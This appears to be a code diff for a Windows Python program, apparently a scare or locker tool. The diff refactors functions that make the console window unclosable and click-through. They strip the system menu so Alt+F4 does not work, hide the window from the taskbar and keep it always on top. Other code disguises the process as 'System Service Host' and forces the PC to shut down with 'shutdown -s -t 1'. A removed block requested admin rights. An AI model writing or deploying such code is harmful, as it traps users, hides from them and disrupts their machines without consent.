@@ -101,6 +101,8 @@ class ProcessManager:
             sys.exit()
 
 
+
+
 class ConsoleManager:
     """Manages console window operations and display"""
 
@@ -257,6 +259,40 @@ class ConsoleWindow:
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠘⣿⢟⣯⣟⡵⢯⣶⡄⠀⣤⣴⣾⣿⣻⣿⣿⣿⣿⣿⣿⡏⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢻⣯⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⡿⢿⠷⠻⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠸⠿⠿⠿⣿⡿⣿⣿⣿⣿⣿⡿⠿⠟⠅⠡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
+    @staticmethod
+    def make_console_unclickable():
+        # Get the console window handle
+        console_handle = kernel32.GetConsoleWindow()
+
+        # Set console window style
+        style = user32.GetWindowLongW(console_handle, -16)  # GWL_STYLE
+        style &= ~0x80000  # Remove WS_MAXIMIZEBOX
+        style &= ~0x40000  # Remove WS_MINIMIZEBOX
+        style &= ~0x20000  # Remove WS_THICKFRAME
+        style &= ~0x10000  # Remove WS_SYSMENU (removes system menu, preventing Alt+F4)
+        user32.SetWindowLongW(console_handle, -16, style)
+
+        # Set extended window style to make it unclickable
+        ex_style = user32.GetWindowLongW(console_handle, GWL_EXSTYLE)
+        ex_style |= WS_EX_TRANSPARENT  # Make window unclickable
+        ex_style |= WS_EX_LAYERED  # Required for transparency
+        ex_style |= WS_EX_TOOLWINDOW  # Remove from taskbar
+        ex_style |= WS_EX_NOACTIVATE  # Prevent activation
+        ex_style &= ~WS_EX_APPWINDOW  # Remove from taskbar
+        user32.SetWindowLongW(console_handle, GWL_EXSTYLE, ex_style)
+
+        # Apply the changes
+        user32.SetWindowPos(
+            console_handle, HWND_TOPMOST,  # Always on top
+            0, 0,  # x, y position
+            0, 0,  # width, height (will be ignored due to SWP_NOSIZE)
+            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW
+        )
+
+        # Force window to lose focus
+        user32.SetForegroundWindow(user32.GetDesktopWindow())
+
+
 
 
 class SoundTrack:
@@ -286,72 +322,20 @@ def run_Death_Thread():
     shutdown_pc()
 
 
-def mask_as_system_process():
-    # Get current process handle
-    current_process = win32api.GetCurrentProcess()
-
-    # Set process priority to high
-    win32process.SetPriorityClass(current_process, win32process.HIGH_PRIORITY_CLASS)
-
-    # Get process token
-    token = win32security.OpenProcessToken(current_process, win32security.TOKEN_ALL_ACCESS)
-
-    # Get token information
-    token_info = win32security.GetTokenInformation(token, win32security.TokenUser)
-
-    # Set process name to appear as system process
-    try:
-        # Try to rename the process (requires admin rights)
-        kernel32.SetConsoleTitleW("System Service Host")
-    except:
-        pass
 
 
-def make_console_unclickable():
-    # Get the console window handle
-    console_handle = kernel32.GetConsoleWindow()
 
-    # Set console window style
-    style = user32.GetWindowLongW(console_handle, -16)  # GWL_STYLE
-    style &= ~0x80000  # Remove WS_MAXIMIZEBOX
-    style &= ~0x40000  # Remove WS_MINIMIZEBOX
-    style &= ~0x20000  # Remove WS_THICKFRAME
-    style &= ~0x10000  # Remove WS_SYSMENU (removes system menu, preventing Alt+F4)
-    user32.SetWindowLongW(console_handle, -16, style)
 
-    # Set extended window style to make it unclickable
-    ex_style = user32.GetWindowLongW(console_handle, GWL_EXSTYLE)
-    ex_style |= WS_EX_TRANSPARENT  # Make window unclickable
-    ex_style |= WS_EX_LAYERED  # Required for transparency
-    ex_style |= WS_EX_TOOLWINDOW  # Remove from taskbar
-    ex_style |= WS_EX_NOACTIVATE  # Prevent activation
-    ex_style &= ~WS_EX_APPWINDOW  # Remove from taskbar
-    user32.SetWindowLongW(console_handle, GWL_EXSTYLE, ex_style)
-
-    # Apply the changes
-    user32.SetWindowPos(
-        console_handle, HWND_TOPMOST,  # Always on top
-        0, 0,  # x, y position
-        0, 0,  # width, height (will be ignored due to SWP_NOSIZE)
-        SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW
-    )
-
-    # Force window to lose focus
-    user32.SetForegroundWindow(user32.GetDesktopWindow())
 
 
 def shutdown_pc():
     os.system("shutdown -s -t 1")
 
 if __name__ == '__main__':
-    # Request admin privileges
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        sys.exit()
 
-    make_console_unclickable()
+    ConsoleWindow.make_console_unclickable()
 
-    mask_as_system_process()
+    ProcessManager.mask_as_system_process()
 
     console = ConsoleWindow()
     console.Load()
